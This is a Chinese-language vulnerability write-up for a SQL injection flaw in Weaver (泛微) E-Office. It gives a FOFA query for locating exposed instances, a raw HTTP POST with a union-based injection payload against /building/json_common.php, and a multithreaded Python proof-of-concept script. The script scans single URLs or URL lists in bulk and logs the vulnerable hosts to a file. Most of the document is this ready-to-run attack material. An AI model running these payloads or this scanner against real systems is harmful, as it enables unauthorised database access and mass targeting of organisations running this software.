### fofa

```markdown
app="泛微-EOffice"
```

### payload

```markdown
POST /building/json_common.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
Content-Length: 87
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(102103122) ,4#|2|333
```

![image-20240909185806793](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240909185806793.png)



### 命令

```markdown
python3 脚本文件名 -u url			     # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```

### poc

```python
import argparse, sys, re, requests
from multiprocessing.dummy import Pool
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

# 禁用urllib3警告
requests.packages.urllib3.disable_warnings()

# 打印程序欢迎界面
def banner():
    test = """
   
██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    
                                                                                         
                                                    data: 2024-09-09
                                                    version: 1.0
                                                    author: hulless-oat                                      
    """
    print(test)

# 主函数
def main():
    banner() # 打印欢迎界面
    parser = argparse.ArgumentParser(description="泛微E-office SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
    args = parser.parse_args()

    # 如果提供了url而没有提供文件路径
    if args.url and not args.file:
        poc(args.url)
    # 如果提供了文件路径而没有提供url
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100) # 创建一个线程池，最大线程数为100
        mp.map(poc,url_list) # 映射poc函数到url列表，并行执行
        mp.close() # 关闭线程池
        mp.join() # 等待所有线程执行完毕
    else:
        print(f"Uage:\n\t python3 {sys.argv[0]} -h")

# 漏洞检测函数
def poc(target):
    # 构造payload的url
    payload = '/building/json_common.php'
    url = target + payload
    headers = {
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
        'Connection':'close',
        'Content-Length':'87',
        'Accept':'*/*',
        'Accept-Language':'en',
        'Content-Type':'application/x-www-form-urlencoded',
        'Accept-Encoding':'gzip',
    }
    data = 'tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(102103122) ,4#|2|333'

    try:
        res = requests.post(url=url,headers=headers,timeout=5,data=data,verify=False)
        if res.status_code == 200 and "6cfe798ba8e5b85feb50164c59f4bec9" in res.text:
            print(f"[+]{GREEN}该URL存在SQL注入漏洞： {target}\n{RESET}")
            with open("result.txt","a",encoding="utf-8") as f:
                f.write(target+'\n')
        else:
            print(f"[-]该URL不存在SQL注入漏洞")

    except Exception as e:
        print(f"[*]该URL无法访问")

# 程序入口
if __name__ == '__main__':
    main()
```

